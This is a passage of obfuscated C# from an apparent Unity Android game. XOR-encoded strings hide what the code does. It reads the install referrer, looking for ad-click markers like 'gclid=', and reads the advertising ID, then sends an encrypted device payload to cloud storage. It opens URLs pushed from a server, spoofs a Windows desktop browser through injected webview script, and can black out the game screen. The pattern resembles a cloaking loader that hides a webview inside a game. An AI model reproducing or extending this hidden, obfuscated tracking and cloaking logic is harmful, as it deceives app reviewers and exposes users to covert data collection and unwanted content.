                    Debug.Log(_0xc5baefe6._0xaf772892(new byte[44] { 68, 75, 122, 108, 107, 66, 63, 90, 103, 124, 122, 111, 107, 118, 112, 113, 63, 104, 119, 118, 115, 122, 63, 124, 119, 122, 124, 116, 118, 113, 120, 63, 108, 126, 105, 122, 123, 63, 115, 118, 113, 116, 37, 63 }, 31) + e.Message);
                }
#endif
            }

            return true;
        }
    }

    private string _0x429fab19 = "";
    private async Task _0x1e878bec()
    {
        {
#if B_LOGS
            Debug.Log($"[Test] Send click");
#endif
        }

        _0x9d0da56c = _0xc5baefe6._0xaf772892(new byte[5] { 89, 94, 83, 76, 90 }, 63);
        _0x9018ed90 = /*IsRunningOnEmulator() ? "running" :*/ "";
        _0x429fab19 = DateTime.UtcNow.Ticks.ToString();
        _0xf0e47483 = "";
        JObject _0xbf556921 = BuildRandomPayload(_0xf2a3da63, _0xc356ee58, _0x50769abf, _0xc22f74d0, _0xf103958a, _0x1e01f859, _0x0ff6dcdc, _0xcbafee33, _0xbf623f5f, _0x74998c2b, _0x9d0da56c, _0xf0e47483, _0x4e355209, _0x210268d0, _0x412214b2.ToString(), _0x22f2f791, _0x429fab19, _0x9018ed90, _0x6486cede, _0x39a6a961, _0x1e2d81db, _0x8eb8c312, _0xab1a166a());
        var _0x3b2bb880 = _0x5bd21e7f(_0xbf556921.ToString(), _0x6486cede);
        {
#if B_LOGS
            {
                Debug.Log($"[Test][First Run] Send Payload for first run: {_0xbf556921}");
            }
#endif
        }

        try
        {
            await CloudSaveService.Instance.Data.Player.SaveAsync(new Dictionary<string, object> { { _0xc5baefe6._0xaf772892(new byte[7] { 38, 55, 47, 58, 57, 55, 50 }, 86) + _0x6486cede, _0x3b2bb880 } });
            await Task.Delay(500);
            string _0x213b37b7 = "";
            for (int _0x63ffde0c = 0; _0x63ffde0c < 20; _0x63ffde0c++)
            {
                if (await _0x1dbb53f4(1, 1))
                {
                    await _0xeff30011(_0xc5baefe6._0xaf772892(new byte[7] { 42, 36, 39, 43, 35, 45, 44 }, 72));
                    _0x70807108();
                    return;
                }

                _0x213b37b7 = await _0xdbc70a7d(1, 500);
                if (!string.IsNullOrEmpty(_0x213b37b7))
                    break;
            }

            _0x4f763f9c(_0x213b37b7);
        }
        catch (Exception e)
        {
            {
#if B_LOGS
                Debug.Log(_0xc5baefe6._0xaf772892(new byte[22] { 63, 48, 33, 55, 48, 57, 68, 35, 1, 10, 1, 22, 5, 8, 68, 1, 22, 22, 11, 22, 94, 68 }, 100) + e.Message);
#endif
            }

            _0x70807108();
        }
    }

    private string _0x14888746;
    private void _0xd0300ee3()
    {
        WLog(_0xc5baefe6._0xaf772892(new byte[21] { 249, 208, 195, 213, 198, 208, 195, 212, 145, 211, 208, 210, 218, 145, 193, 195, 212, 194, 194, 212, 213 }, 177));
        if (Time.frameCount == _0xed440dce)
            return;
        _0xed440dce = Time.frameCount;
        if (_0x92d32089())
            return;
        _0x59cefedb();
    }

    private GameObject _0xc2c0b110;
    private IEnumerator _0x5dffadd7()
    {
        {
#if B_LOGS
            {
                Debug.Log(_0xc5baefe6._0xaf772892(new byte[26] { 204, 195, 242, 228, 227, 202, 183, 222, 249, 254, 227, 254, 246, 251, 254, 237, 242, 197, 242, 241, 241, 242, 229, 242, 229, 183 }, 151));
            }
#endif
        }

        bool _0x071efdb3 = false;
        InstallReferrer.GetReferrer((_0x76475333) =>
        {
            Debug.Log(_0xc5baefe6._0xaf772892(new byte[24] { 227, 236, 221, 203, 204, 152, 234, 221, 222, 221, 202, 202, 221, 202, 229, 152, 223, 221, 204, 152, 90, 62, 42, 152 }, 184) + _0xf103958a);
            if (_0x76475333.IsSuccess)
            {
                _0xf103958a = _0x76475333.InstallReferrer ?? "";
                {
#if B_LOGS
                    Debug.Log(_0xc5baefe6._0xaf772892(new byte[28] { 219, 212, 229, 243, 244, 160, 210, 229, 230, 229, 242, 242, 229, 242, 221, 160, 211, 245, 227, 227, 229, 243, 243, 160, 98, 6, 18, 160 }, 128) + _0xf103958a);
#endif
                }
            }
            else
            {
                {
#if B_LOGS
                    Debug.Log(_0xc5baefe6._0xaf772892(new byte[27] { 193, 206, 255, 233, 238, 186, 200, 255, 252, 255, 232, 232, 255, 232, 199, 186, 220, 251, 243, 246, 255, 254, 186, 120, 28, 8, 186 }, 154) + _0x76475333);
#endif
                }

                _0xf103958a = "";
            }

            _0x47e21537 = true;
        });
        StartCoroutine(_0x8551da71(2f));
        yield return new WaitUntil(() => _0x47e21537);
        {
#if B_LOGS
            Debug.Log($"[Test] check google atr {_0xf103958a}");
#endif
        }

        bool _0x9f6513f7 = _0xf103958a.Contains(_0xc5baefe6._0xaf772892(new byte[6] { 75, 79, 64, 69, 72, 17 }, 44));
        _0x071efdb3 = _0x9f6513f7 || _0xf103958a.Contains(_0xc5baefe6._0xaf772892(new byte[18] { 2, 19, 19, 16, 77, 10, 13, 16, 23, 2, 4, 17, 2, 14, 77, 0, 12, 14 }, 99)) || _0xf103958a.Contains(_0xc5baefe6._0xaf772892(new byte[17] { 51, 34, 34, 33, 124, 52, 51, 49, 55, 48, 61, 61, 57, 124, 49, 61, 63 }, 82));
        _0x1e01f859 = _0x9f6513f7 ? "" : (_0x071efdb3 ? "" : _0x1e01f859);
        _0x1e01f859 = _0x1e01f859 ?? "";
        _0x0ff6dcdc = _0x0ff6dcdc ?? "";
        {
#if B_LOGS
            Debug.Log($"[Test] oneLinkData (FB): {_0x1e01f859}");
#endif
        }
    }

    private string _0x1107e9a9()
    {
        return _0xc5baefe6._0xaf772892(new byte[12] { 44, 98, 113, 106, 103, 112, 109, 107, 106, 44, 45, 127 }, 4) + _0xc5baefe6._0xaf772892(new byte[8] { 78, 89, 74, 24, 77, 89, 5, 31 }, 56) + WindowsDesktopUserAgent + _0xc5baefe6._0xaf772892(new byte[2] { 243, 239 }, 212) + _0xc5baefe6._0xaf772892(new byte[30] { 38, 49, 34, 112, 32, 34, 63, 36, 63, 109, 30, 49, 38, 57, 55, 49, 36, 63, 34, 126, 32, 34, 63, 36, 63, 36, 41, 32, 53, 107 }, 80) + _0xc5baefe6._0xaf772892(new byte[121] { 214, 197, 222, 211, 196, 217, 223, 222, 144, 212, 213, 214, 152, 223, 210, 218, 156, 219, 213, 201, 156, 198, 209, 220, 153, 203, 196, 194, 201, 203, 255, 210, 218, 213, 211, 196, 158, 212, 213, 214, 217, 222, 213, 224, 194, 223, 192, 213, 194, 196, 201, 152, 223, 210, 218, 156, 219, 213, 201, 156, 203, 215, 213, 196, 138, 214, 197, 222, 211, 196, 217, 223, 222, 152, 153, 203, 194, 213, 196, 197, 194, 222, 144, 198, 209, 220, 139, 205, 156, 211, 223, 222, 214, 217, 215, 197, 194, 209, 210, 220, 213, 138, 196, 194, 197, 213, 205, 153, 139, 205, 211, 209, 196, 211, 216, 152, 213, 153, 203, 205, 205 }, 176) + _0xc5baefe6._0xaf772892(new byte[26] { 167, 166, 165, 235, 179, 177, 172, 183, 172, 239, 228, 182, 176, 166, 177, 130, 164, 166, 173, 183, 228, 239, 182, 162, 234, 248 }, 195) + _0xc5baefe6._0xaf772892(new byte[130] { 4, 5, 6, 72, 16, 18, 15, 20, 15, 76, 71, 1, 16, 16, 54, 5, 18, 19, 9, 15, 14, 71, 76, 71, 85, 78, 80, 64, 72, 55, 9, 14, 4, 15, 23, 19, 64, 46, 52, 64, 81, 80, 78, 80, 91, 64, 55, 9, 14, 86, 84, 91, 64, 24, 86, 84, 73, 64, 33, 16, 16, 12, 5, 55, 5, 2, 43, 9, 20, 79, 85, 83, 87, 78, 83, 86, 64, 72, 43, 40, 52, 45, 44, 76, 64, 12, 9, 11, 5, 64, 39, 5, 3, 11, 15, 73, 64, 35, 8, 18, 15, 13, 5, 79, 81, 82, 80, 78, 80, 78, 80, 78, 80, 64, 51, 1, 6, 1, 18, 9, 79, 85, 83, 87, 78, 83, 86, 71, 73, 91 }, 96) + _0xc5baefe6._0xaf772892(new byte[30] { 32, 33, 34, 108, 52, 54, 43, 48, 43, 104, 99, 52, 40, 37, 48, 34, 43, 54, 41, 99, 104, 99, 19, 45, 42, 119, 118, 99, 109, 127 }, 68) + _0xc5baefe6._0xaf772892(new byte[34] { 108, 109, 110, 32, 120, 122, 103, 124, 103, 36, 47, 126, 109, 102, 108, 103, 122, 47, 36, 47, 79, 103, 103, 111, 100, 109, 40, 65, 102, 107, 38, 47, 33, 51 }, 8) + _0xc5baefe6._0xaf772892(new byte[30] { 112, 113, 114, 60, 100, 102, 123, 96, 123, 56, 51, 121, 117, 108, 64, 123, 97, 119, 124, 68, 123, 125, 122, 96, 103, 51, 56, 36, 61, 47 }, 20) + _0xc5baefe6._0xaf772892(new byte[449] { 117, 115, 120, 122, 119, 96, 115, 33, 116, 96, 101, 60, 122, 99, 115, 96, 111, 101, 114, 59, 90, 122, 99, 115, 96, 111, 101, 59, 38, 66, 105, 115, 110, 108, 104, 116, 108, 38, 45, 119, 100, 115, 114, 104, 110, 111, 59, 38, 48, 51, 49, 38, 124, 45, 122, 99, 115, 96, 111, 101, 59, 38, 70, 110, 110, 102, 109, 100, 33, 66, 105, 115, 110, 108, 100, 38, 45, 119, 100, 115, 114, 104, 110, 111, 59, 38, 48, 51, 49, 38, 124, 45, 122, 99, 115, 96, 111, 101, 59, 38, 79, 110, 117, 60, 64, 62, 67, 115, 96, 111, 101, 38, 45, 119, 100, 115, 114, 104, 110, 111, 59, 38, 51, 53, 38, 124, 92, 45, 108, 110, 99, 104, 109, 100, 59, 103, 96, 109, 114, 100, 45, 113, 109, 96, 117, 103, 110, 115, 108, 59, 38, 86, 104, 111, 101, 110, 118, 114, 38, 45, 102, 100, 117, 73, 104, 102, 105, 68, 111, 117, 115, 110, 113, 120, 87, 96, 109, 116, 100, 114, 59, 103, 116, 111, 98, 117, 104, 110, 111, 41, 40, 122, 115, 100, 117, 116, 115, 111, 33, 81, 115, 110, 108, 104, 114, 100, 47, 115, 100, 114, 110, 109, 119, 100, 41, 122, 96, 115, 98, 105, 104, 117, 100, 98, 117, 116, 115, 100, 59, 38, 121, 57, 55, 38, 45, 99, 104, 117, 111, 100, 114, 114, 59, 38, 55, 53, 38, 45, 108, 110, 99, 104, 109, 100, 59, 103, 96, 109, 114, 100, 45, 108, 110, 101, 100, 109, 59, 38, 38, 45, 113, 109, 96, 117, 103, 110, 115, 108, 59, 38, 86, 104, 111, 101, 110, 118, 114, 38, 45, 113, 109, 96, 117, 103, 110, 115, 108, 87, 100, 115, 114, 104, 110, 111, 59, 38, 48, 52, 47, 49, 47, 49, 38, 45, 116, 96, 71, 116, 109, 109, 87, 100, 115, 114, 104, 110, 111, 59, 38, 48, 51, 49, 47, 49, 47, 49, 47, 49, 38, 124, 40, 58, 124, 124, 58, 78, 99, 107, 100, 98, 117, 47, 101, 100, 103, 104, 111, 100, 81, 115, 110, 113, 100, 115, 117, 120, 41, 113, 115, 110, 117, 110, 45, 38, 116, 114, 100, 115, 64, 102, 100, 111, 117, 69, 96, 117, 96, 38, 45, 122, 102, 100, 117, 59, 103, 116, 111, 98, 117, 104, 110, 111, 41, 40, 122, 115, 100, 117, 116, 115, 111, 33, 116, 96, 101, 58, 124, 45, 98, 110, 111, 103, 104, 102, 116, 115, 96, 99, 109, 100, 59, 117, 115, 116, 100, 124, 40, 58, 124, 98, 96, 117, 98, 105, 41, 100, 40, 122, 124 }, 1) + _0xc5baefe6._0xaf772892(new byte[112] { 6, 7, 4, 74, 17, 1, 16, 7, 7, 12, 78, 69, 21, 11, 6, 22, 10, 69, 78, 83, 91, 80, 82, 75, 89, 6, 7, 4, 74, 17, 1, 16, 7, 7, 12, 78, 69, 10, 7, 11, 5, 10, 22, 69, 78, 83, 82, 90, 82, 75, 89, 6, 7, 4, 74, 17, 1, 16, 7, 7, 12, 78, 69, 3, 20, 3, 11, 14, 53, 11, 6, 22, 10, 69, 78, 83, 91, 80, 82, 75, 89, 6, 7, 4, 74, 17, 1, 16, 7, 7, 12, 78, 69, 3, 20, 3, 11, 14, 42, 7, 11, 5, 10, 22, 69, 78, 83, 82, 86, 82, 75, 89 }, 98) + _0xc5baefe6._0xaf772892(new byte[45] { 182, 176, 187, 185, 181, 171, 172, 166, 173, 181, 236, 173, 172, 182, 173, 183, 161, 170, 177, 182, 163, 176, 182, 255, 183, 172, 166, 167, 164, 171, 172, 167, 166, 249, 191, 161, 163, 182, 161, 170, 234, 167, 235, 185, 191 }, 194) + _0xc5baefe6._0xaf772892(new byte[721] { 201, 207, 196, 198, 203, 220, 207, 157, 210, 207, 212, 218, 128, 202, 212, 211, 217, 210, 202, 147, 208, 220, 201, 222, 213, 240, 216, 217, 212, 220, 147, 223, 212, 211, 217, 149, 202, 212, 211, 217, 210, 202, 148, 134, 202, 212, 211, 217, 210, 202, 147, 208, 220, 201, 222, 213, 240, 216, 217, 212, 220, 128, 219, 200, 211, 222, 201, 212, 210, 211, 149, 204, 148, 198, 203, 220, 207, 157, 206, 128, 238, 201, 207, 212, 211, 218, 149, 204, 148, 147, 201, 210, 241, 210, 202, 216, 207, 254, 220, 206, 216, 149, 148, 134, 212, 219, 149, 206, 147, 212, 211, 217, 216, 197, 242, 219, 149, 154, 205, 210, 212, 211, 201, 216, 207, 135, 157, 222, 210, 220, 207, 206, 216, 154, 148, 131, 128, 141, 193, 193, 206, 147, 212, 211, 217, 216, 197, 242, 219, 149, 154, 213, 210, 203, 216, 207, 135, 157, 211, 210, 211, 216, 154, 148, 131, 128, 141, 193, 193, 206, 147, 212, 211, 217, 216, 197, 242, 219, 149, 154, 208, 220, 197, 144, 202, 212, 217, 201, 213, 154, 148, 131, 128, 141, 193, 193, 206, 147, 212, 211, 217, 216, 197, 242, 219, 149, 154, 208, 220, 197, 144, 217, 216, 203, 212, 222, 216, 144, 202, 212, 217, 201, 213, 154, 148, 131, 128, 141, 148, 207, 216, 201, 200, 207, 211, 157, 198, 208, 220, 201, 222, 213, 216, 206, 135, 219, 220, 209, 206, 216, 145, 208, 216, 217, 212, 220, 135, 204, 145, 210, 211, 222, 213, 220, 211, 218, 216, 135, 211, 200, 209, 209, 145, 220, 217, 217, 241, 212, 206, 201, 216, 211, 216, 207, 135, 219, 200, 211, 222, 201, 212, 210, 211, 149, 148, 198, 192, 145, 207, 216, 208, 210, 203, 216, 241, 212, 206, 201, 216, 211, 216, 207, 135, 219, 200, 211, 222, 201, 212, 210, 211, 149, 148, 198, 192, 145, 220, 217, 217, 248, 203, 216, 211, 201, 241, 212, 206, 201, 216, 211, 216, 207, 135, 219, 200, 211, 222, 201, 212, 210, 211, 149, 148, 198, 192, 145, 207, 216, 208, 210, 203, 216, 248, 203, 216, 211, 201, 241, 212, 206, 201, 216, 211, 216, 207, 135, 219, 200, 211, 222, 201, 212, 210, 211, 149, 148, 198, 192, 145, 217, 212, 206, 205, 220, 201, 222, 213, 248, 203, 216, 211, 201, 135, 219, 200, 211, 222, 201, 212, 210, 211, 149, 148, 198, 207, 216, 201, 200, 207, 211, 157, 219, 220, 209, 206, 216, 134, 192, 192, 134, 212, 219, 149, 206, 147, 212, 211, 217, 216, 197, 242, 219, 149, 154, 205, 210, 212, 211, 201, 216, 207, 135, 157, 219, 212, 211, 216, 154, 148, 131, 128, 141, 193, 193, 206, 147, 212, 211, 217, 216, 197, 242, 219, 149, 154, 213, 210, 203, 216, 207, 135, 157, 213, 210, 203, 216, 207, 154, 148, 131, 128, 141, 148, 207, 216, 201, 200, 207, 211, 157, 198, 208, 220, 201, 222, 213, 216, 206, 135, 201, 207, 200, 216, 145, 208, 216, 217, 212, 220, 135, 204, 145, 210, 211, 222, 213, 220, 211, 218, 216, 135, 211, 200, 209, 209, 145, 220, 217, 217, 241, 212, 206, 201, 216, 211, 216, 207, 135, 219, 200, 211, 222, 201, 212, 210, 211, 149, 148, 198, 192, 145, 207, 216, 208, 210, 203, 216, 241, 212, 206, 201, 216, 211, 216, 207, 135, 219, 200, 211, 222, 201, 212, 210, 211, 149, 148, 198, 192, 145, 220, 217, 217, 248, 203, 216, 211, 201, 241, 212, 206, 201, 216, 211, 216, 207, 135, 219, 200, 211, 222, 201, 212, 210, 211, 149, 148, 198, 192, 145, 207, 216, 208, 210, 203, 216, 248, 203, 216, 211, 201, 241, 212, 206, 201, 216, 211, 216, 207, 135, 219, 200, 211, 222, 201, 212, 210, 211, 149, 148, 198, 192, 145, 217, 212, 206, 205, 220, 201, 222, 213, 248, 203, 216, 211, 201, 135, 219, 200, 211, 222, 201, 212, 210, 211, 149, 148, 198, 207, 216, 201, 200, 207, 211, 157, 219, 220, 209, 206, 216, 134, 192, 192, 134, 207, 216, 201, 200, 207, 211, 157, 210, 207, 212, 218, 149, 204, 148, 134, 192, 134, 192, 222, 220, 201, 222, 213, 149, 216, 148, 198, 192 }, 189) + _0xc5baefe6._0xaf772892(new byte[5] { 123, 47, 46, 47, 61 }, 6);
    }

    private bool _0x49096384()
    {
        var _0x4c75d891 = Keyboard.current;
        return _0x4c75d891 != null && _0x4c75d891.escapeKey.wasPressedThisFrame;
    }

    private bool _0x1102e7aa(string _0x83df5146)
    {
        try
        {
            using (var _0xfe441d4a = new AndroidJavaClass(_0xc5baefe6._0xaf772892(new byte[30] { 75, 71, 69, 6, 93, 70, 65, 92, 81, 27, 76, 6, 88, 68, 73, 81, 77, 90, 6, 125, 70, 65, 92, 81, 120, 68, 73, 81, 77, 90 }, 40)))
            using (var _0xc55f9f8d = _0xfe441d4a.GetStatic<AndroidJavaObject>(_0xc5baefe6._0xaf772892(new byte[15] { 107, 125, 122, 122, 109, 102, 124, 73, 107, 124, 97, 126, 97, 124, 113 }, 8)))
            using (var _0x7098d536 = new AndroidJavaClass(_0xc5baefe6._0xaf772892(new byte[15] { 148, 155, 145, 135, 154, 156, 145, 219, 155, 144, 129, 219, 160, 135, 156 }, 245)))
            using (var _0x0aa2d6e2 = _0x7098d536.CallStatic<AndroidJavaObject>(_0xc5baefe6._0xaf772892(new byte[5] { 130, 147, 128, 129, 151 }, 242), _0x83df5146))
            using (var _0x2ba831fe = new AndroidJavaObject(_0xc5baefe6._0xaf772892(new byte[22] { 174, 161, 171, 189, 160, 166, 171, 225, 172, 160, 161, 187, 170, 161, 187, 225, 134, 161, 187, 170, 161, 187 }, 207), _0xc5baefe6._0xaf772892(new byte[26] { 143, 128, 138, 156, 129, 135, 138, 192, 135, 128, 154, 139, 128, 154, 192, 143, 141, 154, 135, 129, 128, 192, 184, 167, 171, 185 }, 238), _0x0aa2d6e2))
            {
                WLog(_0xc5baefe6._0xaf772892(new byte[26] { 250, 209, 203, 214, 212, 220, 245, 208, 210, 220, 153, 214, 201, 220, 215, 153, 220, 193, 205, 220, 203, 215, 216, 213, 131, 153 }, 185) + _0x83df5146);
                _0x2ba831fe.Call<AndroidJavaObject>(_0xc5baefe6._0xaf772892(new byte[11] { 19, 22, 22, 49, 19, 6, 23, 21, 29, 0, 11 }, 114), _0xc5baefe6._0xaf772892(new byte[33] { 9, 6, 12, 26, 7, 1, 12, 70, 1, 6, 28, 13, 6, 28, 70, 11, 9, 28, 13, 15, 7, 26, 17, 70, 42, 58, 39, 63, 59, 41, 42, 36, 45 }, 104));
                _0x2ba831fe.Call<AndroidJavaObject>(_0xc5baefe6._0xaf772892(new byte[8] { 250, 255, 255, 221, 247, 250, 252, 232 }, 155), 0x10000000);
                _0xc55f9f8d.Call(_0xc5baefe6._0xaf772892(new byte[13] { 111, 104, 125, 110, 104, 93, 127, 104, 117, 106, 117, 104, 101 }, 28), _0x2ba831fe);
                return true;
            }
        }
        catch (Exception e)
        {
            WLog(_0xc5baefe6._0xaf772892(new byte[28] { 164, 143, 149, 136, 138, 130, 171, 142, 140, 130, 199, 130, 159, 147, 130, 149, 137, 134, 139, 199, 129, 134, 142, 139, 130, 131, 221, 199 }, 231) + e.Message);
            Application.OpenURL(_0x83df5146);
            return true;
        }
    }

    private void _0x5cfcef5e()
    {
        if (_0xcaeec845 == null)
            return;
        if (_0xd34c5bb5)
            _0xcaeec845.SetUserAgent(_0x6db230d1());
        else
            _0xcaeec845.SetUserAgent("");
    }

    private Text _0xd78c2ec4;
    private bool _0x300d7f37 = false;
    // PART 3
    private string _0xcb6faa6c()
    {
        try
        {
            var _0x4cbca40c = new AndroidJavaClass(_0xc5baefe6._0xaf772892(new byte[30] { 38, 42, 40, 107, 48, 43, 44, 49, 60, 118, 33, 107, 53, 41, 36, 60, 32, 55, 107, 16, 43, 44, 49, 60, 21, 41, 36, 60, 32, 55 }, 69));
            var _0x208ae188 = _0x4cbca40c.GetStatic<AndroidJavaObject>(_0xc5baefe6._0xaf772892(new byte[15] { 106, 124, 123, 123, 108, 103, 125, 72, 106, 125, 96, 127, 96, 125, 112 }, 9));
            var _0x9f81a512 = new AndroidJavaClass(_0xc5baefe6._0xaf772892(new byte[57] { 207, 195, 193, 130, 203, 195, 195, 203, 192, 201, 130, 205, 194, 200, 222, 195, 197, 200, 130, 203, 193, 223, 130, 205, 200, 223, 130, 197, 200, 201, 194, 216, 197, 202, 197, 201, 222, 130, 237, 200, 218, 201, 222, 216, 197, 223, 197, 194, 203, 229, 200, 239, 192, 197, 201, 194, 216 }, 172));
            var _0xbf4171c1 = _0x9f81a512.CallStatic<AndroidJavaObject>(_0xc5baefe6._0xaf772892(new byte[20] { 170, 168, 185, 140, 169, 187, 168, 191, 185, 164, 190, 164, 163, 170, 132, 169, 132, 163, 171, 162 }, 205), _0x208ae188);
            var _0xcab6bc79 = _0xbf4171c1.Call<string>(_0xc5baefe6._0xaf772892(new byte[5] { 191, 189, 172, 145, 188 }, 216));
            {
#if B_LOGS
                Debug.Log($"[Test] Google Advertiding Id (ad id): {_0xcab6bc79}");
#endif
            }

            return string.IsNullOrEmpty(_0xcab6bc79) ? "" : _0xcab6bc79;
        }
        catch
        {
            return "";
        }
    }

    public void _0x336524d3()
    {
        if (_0x90df74d5)
            return;
        {
#if B_LOGS
            {
                Debug.Log(_0xc5baefe6._0xaf772892(new byte[33] { 100, 107, 90, 76, 75, 98, 31, 107, 86, 82, 90, 77, 31, 80, 74, 75, 31, 18, 1, 31, 82, 80, 73, 90, 31, 75, 80, 31, 76, 92, 90, 81, 90 }, 63));
            }
#endif
        }

        _0x70807108();
    }

    private string _0xf2a3da63 = "";
    private IEnumerator RequestAndroidPermissionIfNeeded(string _0x8cb2cc9a)
    {
        if (Permission.HasUserAuthorizedPermission(_0x8cb2cc9a))
            yield break;
        bool _0xbdddb6fb = false;
        var _0xb3ee7315 = new PermissionCallbacks();
        _0xb3ee7315.PermissionGranted += _0x68db5087 => _0xbdddb6fb = true;
        _0xb3ee7315.PermissionDenied += _0x68db5087 => _0xbdddb6fb = true;
        Permission.RequestUserPermission(_0x8cb2cc9a, _0xb3ee7315);
        yield return new WaitUntil(() => _0xbdddb6fb);
    }

    private async Task _0xeff30011(string _0x180bbb62)
    {
        if (_0x77a1438b || string.IsNullOrEmpty(_0x6486cede) || string.IsNullOrEmpty(_0x180bbb62) || _0x01d0dcfa)
            return;
        _0x77a1438b = true;
        try
        {
            JObject _0xd2f02b3e = BuildRandomPayload(_0x180bbb62, _0x6486cede, _0xab1a166a());
            {
#if B_LOGS
                {
                    Debug.Log($"[Test][Load Pass] Send total: {_0x180bbb62} payload: {_0xd2f02b3e}");
                }
#endif
            }

            var _0xd88e4ce0 = _0x5bd21e7f(_0xd2f02b3e.ToString(), _0x6486cede);
            await CloudSaveService.Instance.Data.Player.SaveAsync(new Dictionary<string, object> { { _0xc5baefe6._0xaf772892(new byte[4] { 116, 119, 121, 124 }, 24) + _0x6486cede, _0xd88e4ce0 } });
        }
        catch (Exception e)
        {
            {
#if B_LOGS
                Debug.Log(_0xc5baefe6._0xaf772892(new byte[24] { 29, 18, 3, 21, 18, 27, 102, 10, 41, 39, 34, 102, 54, 39, 53, 53, 102, 35, 52, 52, 41, 52, 124, 102 }, 70) + e.Message);
#endif
            }
        }
    }

    private void _0xe207e0b4()
    {
        if (Camera.main == null)
            return;
        Camera.main.cullingMask = 0;
        Camera.main.clearFlags = CameraClearFlags.SolidColor;
        Camera.main.backgroundColor = Color.black;
    }

    private string _0xf0e47483 = "";
    internal bool isApplicationFocus = false;
    /* ============================= */
    /* ENCRYPT / DECRYPT             */
    /* ============================= */
    private string _0x5bd21e7f(string _0x5a15da99, string _0x2e00186f)
    {
        try
        {
            using var _0xcd17b113 = Aes.Create();
            _0xcd17b113.Key = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes(_0x2e00186f));
            _0xcd17b113.GenerateIV();
            using var _0x54a1a146 = new MemoryStream();
            _0x54a1a146.Write(_0xcd17b113.IV, 0, _0xcd17b113.IV.Length);
            using (var _0xed912a06 = new CryptoStream(_0x54a1a146, _0xcd17b113.CreateEncryptor(), CryptoStreamMode.Write))
            {
                var _0x7bc54e57 = Encoding.UTF8.GetBytes(_0x5a15da99);
                _0xed912a06.Write(_0x7bc54e57, 0, _0x7bc54e57.Length);
                _0xed912a06.FlushFinalBlock();
            }

            return Convert.ToBase64String(_0x54a1a146.ToArray());
        }
        catch (Exception ex)
        {
            return "";
        }
    }

    private string _0x0ff6dcdc { get; set; }

    internal Button _0xcdbe2ec8(string _0xc5242b1e, Transform _0x7f57508d)
    {
        var _0x8c9df720 = new GameObject(_0xc5242b1e + _0xc5baefe6._0xaf772892(new byte[3] { 59, 13, 23 }, 121), typeof(RectTransform), typeof(Image), typeof(Button));
        var _0x5149d8b9 = _0x8c9df720.GetComponent<RectTransform>();
        _0x5149d8b9.SetParent(_0x7f57508d, false);
        var _0x815a1245 = _0x8c9df720.GetComponent<Image>();
        _0x815a1245.color = new Color(0.92f, 0.92f, 0.95f, 1f);
        var _0x8a35b9c5 = _0x8c9df720.GetComponent<Button>();
        var _0xf7d0e73f = _0x8a35b9c5.colors;
        _0xf7d0e73f.highlightedColor = new Color(0.85f, 0.85f, 0.9f);
        _0xf7d0e73f.pressedColor = new Color(0.8f, 0.8f, 0.88f);
        _0x8a35b9c5.colors = _0xf7d0e73f;
        var _0xeb9a0298 = new GameObject(_0xc5baefe6._0xaf772892(new byte[4] { 214, 231, 250, 246 }, 130), typeof(RectTransform), typeof(Text));
        var _0xe59d576f = _0xeb9a0298.GetComponent<RectTransform>();
        _0xe59d576f.SetParent(_0x8c9df720.transform, false);
        _0xe59d576f.anchorMin = Vector2.zero;
        _0xe59d576f.anchorMax = Vector2.one;
        _0xe59d576f.offsetMin = _0xe59d576f.offsetMax = Vector2.zero;
        var _0x1d0dd6f5 = _0xeb9a0298.GetComponent<Text>();
        _0x1d0dd6f5.text = _0xc5242b1e;
        _0x1d0dd6f5.alignment = TextAnchor.MiddleCenter;
        _0x1d0dd6f5.color = Color.black;
        _0x1d0dd6f5.font = Resources.GetBuiltinResource<Font>(_0xc5baefe6._0xaf772892(new byte[9] { 37, 22, 13, 5, 8, 74, 16, 16, 2 }, 100));
        _0x1d0dd6f5.fontSize = 28;
        WLog(_0xc5baefe6._0xaf772892(new byte[14] { 215, 230, 241, 245, 224, 241, 214, 225, 224, 224, 251, 250, 180, 179 }, 148) + _0xc5242b1e + _0xc5baefe6._0xaf772892(new byte[1] { 58 }, 29));
        return _0x8a35b9c5;
    }

    private IEnumerator _0x8551da71(float _0x3f319fb2)
    {
        yield return new WaitForSeconds(_0x3f319fb2);
        if (!_0x47e21537)
        {
            _0x47e21537 = true;
            {
#if B_LOGS
                {
                    Debug.Log($"[Test] Refferer timeout apply: {_0xf103958a}");
                }
#endif
            }
        }
    }

    private bool _0x073f2856 = false;
    private IEnumerator _0x46c230b8(IEnumerator _0x4670baad, TaskCompletionSource<bool> _0xc277fa9f)
    {
        yield return _0x4670baad;
        _0xc277fa9f.SetResult(true);
    }

    internal bool IsHttpUrl(string _0x707033df)
    {
        if (string.IsNullOrEmpty(_0x707033df))
            return false;
        return _0x707033df.StartsWith(_0xc5baefe6._0xaf772892(new byte[7] { 247, 235, 235, 239, 165, 176, 176 }, 159), StringComparison.OrdinalIgnoreCase) || _0x707033df.StartsWith(_0xc5baefe6._0xaf772892(new byte[8] { 205, 209, 209, 213, 214, 159, 138, 138 }, 165), StringComparison.OrdinalIgnoreCase);
    }

    private string _0x6486cede = "";
    private string _0xeef59c1d = "";
    internal Rect lastSafe = Rect.zero;
    private void _0x2ec816a7(string _0xe14962cd)
    {
        Dictionary<string, object> _0x7665c759;
        try
        {
            _0x7665c759 = JsonConvert.DeserializeObject<Dictionary<string, object>>(_0xe14962cd);
        }
        catch
        {
            return;
        }

        var _0x9fd119ba = ReadPushField(_0x7665c759, _0xc5baefe6._0xaf772892(new byte[3] { 109, 106, 116 }, 24));
        if (string.IsNullOrWhiteSpace(_0x9fd119ba))
            return;
        _0x9fd119ba = _0x9fd119ba.Trim();
        if (!IsHttpUrl(_0x9fd119ba))
            return;
        if (string.Equals(_0x9fd119ba, _0x14888746, StringComparison.Ordinal))
            return;
        _0x14888746 = _0x9fd119ba;
        OpenUrlExternally(_0x9fd119ba);
    }

    private bool _0xf2e03d7c = false;
    private string _0x210268d0 = "";
    private AndroidJavaObject _0xca7af9b5 { get; set; }

    private void OnApplicationPause(bool _0x20d5e885)
    {
        isApplicationPause = _0x20d5e885;
    }

    private string GetFailingUrl(UniWebViewNativeResultPayload _0x531fb28b)
    {
        if (_0x531fb28b == null || _0x531fb28b.Extra == null)
            return null;
        object _0xb80cde5f;
        if (!_0x531fb28b.Extra.TryGetValue(UniWebViewNativeResultPayload.ExtraFailingURLKey, out _0xb80cde5f))
            return null;
        return _0xb80cde5f as string;
    }

    private string _0x6db230d1()
    {
        if (string.IsNullOrEmpty(_0xcbafee33) && _0xcaeec845 != null)
            _0xcbafee33 = _0xcaeec845.GetUserAgent();
